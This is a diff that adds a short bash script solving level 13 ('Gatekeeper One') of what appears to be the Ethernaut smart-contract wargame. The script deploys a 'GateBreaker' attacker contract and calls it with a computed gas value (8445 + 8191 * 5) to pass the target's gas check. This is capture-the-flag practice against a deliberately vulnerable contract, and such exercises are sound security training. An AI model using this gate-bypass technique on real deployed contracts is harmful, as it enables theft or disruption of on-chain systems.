@@ -1,0 +1,11 @@
+#!/bin/bash
+
+set -e -o pipefail
+
+source key
+CON=0xd01912047ed049B2c36865f8a026d8ed0A001C5B
+
+# forge create  --rpc-url http://127.0.0.1:8545 --private-key $KEY '13.gatekeeper_one.sol:GateBreaker' --constructor-args $CON
+BREAKER=0xc904a8de767dddc27026391f853092acb7dd8291
+GAS=49400 # 8445 + 8191 * 5
+cast send --private-key $KEY $BREAKER 'enter(uint)' $GAS
